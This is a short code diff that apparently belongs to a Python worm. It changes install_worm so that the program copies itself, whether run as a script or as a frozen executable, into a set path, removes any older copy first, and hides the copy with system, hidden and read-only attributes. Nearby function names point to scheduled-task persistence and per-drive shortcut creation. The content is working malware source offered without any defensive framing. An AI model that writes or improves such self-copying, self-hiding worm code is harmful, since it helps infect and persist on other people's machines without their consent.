@@ -55,9 +55,15 @@ def create_scheduled_tasks(self_only = False):
             f.write("done")
 
 def install_worm():
+    if os.path.exists(WORM_PATH):
+        try:
+            os.remove(WORM_PATH)
+        except Exception as e:
+            print(f"Cannot delete existing file: {e}")
+    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
     if not os.path.exists(os.path.dirname(WORM_PATH)):
         os.makedirs(os.path.dirname(WORM_PATH))
-    shutil.copy(sys.executable, WORM_PATH)
+    shutil.copy(exe_path, WORM_PATH)
     subprocess.run(f"attrib +h +s +r {WORM_PATH}", shell=True)
 
 def create_shortcut(drive):
